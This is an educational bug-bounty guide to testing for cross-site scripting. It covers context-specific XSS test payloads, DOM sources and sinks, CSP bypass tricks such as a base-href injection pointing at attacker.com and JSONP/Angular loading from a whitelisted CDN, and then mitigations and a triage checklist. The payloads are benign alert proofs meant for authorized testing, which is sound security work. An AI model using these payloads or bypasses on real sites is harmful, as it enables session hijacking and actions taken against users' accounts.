# 📁 Cross-Site Scripting (XSS) — Comprehensive Testing Methodology

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** Cross-Site Scripting vulnerabilities execute code directly inside an end user's browser session. Test strictly on authorized targets. **Never exfiltrate session cookies, steal credentials, deploy keyloggers, or deface websites.** Use benign, standardized verification proofs-of-concept (such as `alert(document.domain)`, `console.log(1)`, or harmless DOM elements).

---

## 📌 Executive Summary

**Cross-Site Scripting (XSS)** occurs when a web application includes untrusted user data in a webpage without adequate validation or context-aware output encoding, allowing an attacker to inject client-side scripts (typically JavaScript) that execute in the browser of other users visiting the application.

### ⚠️ Real-World Impact
Because the injected script executes within the victim's authenticated origin context, an attacker can:
- Hijack authenticated user sessions by stealing non-HttpOnly session tokens or local storage JWTs.
- Perform arbitrary unauthorized actions on behalf of the victim (acting as a dynamic CSRF).
- Capture user keystrokes, passwords, and form submissions.
- Force redirect users to malicious phishing pages.

```
+---------------------------------------------------------------------------------+
|                                 The 3 Types of XSS                              |
+---------------------------------------------------------------------------------+
        |                                |                                 |
        v                                v                                 v
   Reflected XSS                    Stored XSS                         DOM-based XSS
  - Immediate execution            - Persistent in database          - Purely client-side
  - Delivered via link             - Affects all viewers             - Sources -> Sinks
  - Server reflects payload        - Highest severity                - No server reflection needed
```

---

## 🔍 Context-Aware Testing Methodology

The key to finding and exploiting XSS is identifying the **exact execution context** where user input is reflected. Injecting `<script>alert(1)</script>` will fail if the input lands inside an HTML attribute or JavaScript string.

### 1. HTML Body Context
*Reflection point:* `<div>Welcome, USER_INPUT!</div>`
- **Objective:** Break into an HTML tag or script element.
- **Test Payloads:**
  ```html
  <script>alert(document.domain)</script>
  <img src=x onerror=alert(document.domain)>
  <svg onload=alert(document.domain)>
  <details open ontoggle=alert(document.domain)>
  ```

---

### 2. HTML Attribute Context
*Reflection point:* `<input type="text" name="search" value="USER_INPUT">`
- **Objective:** Break out of the enclosing attribute quote (`"` or `'`), or inject new event handlers.
- **Test Payloads:**
  ```html
  " onfocus="alert(document.domain)" autofocus="
  " onmouseover="alert(document.domain)" "
  "><script>alert(document.domain)</script>
  ```

---

### 3. JavaScript Execution Context
*Reflection point:*
```html
<script>
  var username = 'USER_INPUT';
</script>
```
- **Objective:** Break out of the string literal, execute code, and fix syntax.
- **Test Payloads:**
  ```javascript
  ';alert(document.domain);//
  '-alert(document.domain)-'
  </script><script>alert(document.domain)</script>
  ```
- *Template Literal context:* ``var msg = `Hello ${alert(document.domain)}`;``

---

### 4. Hyperlink / URL Context
*Reflection point:* `<a href="USER_INPUT">Click Here</a>`
- **Objective:** Use the pseudo-protocol `javascript:` to execute code when clicked.
- **Test Payloads:**
  ```html
  javascript:alert(document.domain)
  javascript:/*--></title></style></textarea>*/<script>alert(document.domain)</script>
  ```

---

## 🔬 DOM-Based XSS (Sources & Sinks)

DOM-based XSS occurs entirely within client-side JavaScript when an untrusted **Source** flows into an execution **Sink** without proper sanitization.

### Common DOM Sources:
- `location.search` (URL query parameters)
- `location.hash` (URL fragment `#`)
- `document.referrer`
- `window.name`
- `postMessage()` events (`event.data`)

### Dangerous DOM Execution Sinks:

| Sink Category | Dangerous JavaScript Functions |
| :--- | :--- |
| **HTML Injection** | `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()` |
| **Code Execution** | `eval()`, `setTimeout()`, `setInterval()`, `new Function()` |
| **Navigation** | `location.href`, `location.assign()`, `location.replace()`, `window.open()` |
| **jQuery Sinks** | `$()`, `$.html()`, `$.append()`, `$.parseHTML()` |

#### Testing Procedure:
1. Open Browser DevTools -> Console & Sources tab.
2. Search client-side JavaScript for dangerous sinks (e.g. `.innerHTML = `).
3. Trace backwards from the sink to see where the data originates.
4. Craft an input that reaches the sink and executes code.

---

## 🛡️ Content Security Policy (CSP) Analysis

Even if an XSS injection is confirmed, a strong **Content Security Policy (CSP)** can restrict execution. Analyze the `Content-Security-Policy` header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```

### Common CSP Weaknesses & Bypasses:
1. **`'unsafe-inline'` Present:** Allows all inline `<script>` tags and event handlers.
2. **`'unsafe-eval'` Present:** Allows string-to-code execution (`eval()`, `setTimeout()`).
3. **Missing `object-src` and `base-uri`:** Allows injection of `<base href="https://attacker.com">` to hijack relative script paths.
4. **JSONP Endpoints on Whitelisted CDNs:** If `https://cdnjs.cloudflare.com` is whitelisted, load a JSONP callback:
   ```html
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js"></script>
   ```

---

## 🛠️ Safe Educational Verification Template

### Safe HTTP Request Example (Reflected XSS)
```http
GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

### Response Reflection
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<div class="search-results">
  Results for: <script>alert(document.domain)</script>
</div>
```

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Context-Aware Output Encoding
Never use raw string concatenation in HTML templates. Use context-aware encoding functions:
- **HTML Body:** Encode `&`, `<`, `>`, `"`, `'`.
- **HTML Attributes:** Encode all non-alphanumeric characters with HTML entities.
- **JavaScript Strings:** Use JSON serialization (`json.dumps()` in Python, `JSON.stringify()` in JS) or Unicode escapes (`\u0027`).

### 2. Client-Side Sanitization (DOMPurify)
When rendering user-supplied HTML markup in modern frontend applications:
```javascript
// ✅ SECURE with DOMPurify
import DOMPurify from 'dompurify';

const cleanHTML = DOMPurify.sanitize(userProvidedContent);
document.getElementById('content').innerHTML = cleanHTML;
```

### 3. Deploy a Strict Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';
```

### 4. Protect Session Cookies with `HttpOnly`
Ensure all session identifiers include the `HttpOnly` flag so they cannot be accessed by JavaScript via `document.cookie`:
```http
Set-Cookie: session_id=XYZ123; Secure; HttpOnly; SameSite=Lax; Path=/
```

---

## 📊 CVSS 3.1 Severity Reference

- **Stored XSS in Administrative Portal:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (Score: **9.0 - Critical**)
- **Stored XSS affecting Regular Users:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (Score: **5.4 - Medium**)
- **Reflected XSS (Unauthenticated):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (Score: **6.1 - Medium**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Target URL and parameter are verified in scope.
- [ ] Confirmed exact reflection context (HTML body, attribute, script tag, DOM sink).
- [ ] Injected strictly benign proof-of-concept (`alert(document.domain)`).
- [ ] Confirmed code execution in multiple modern browsers.
- [ ] Documented CSP restrictions if present.
- [ ] Included full URL, request headers, and screenshots in the report.
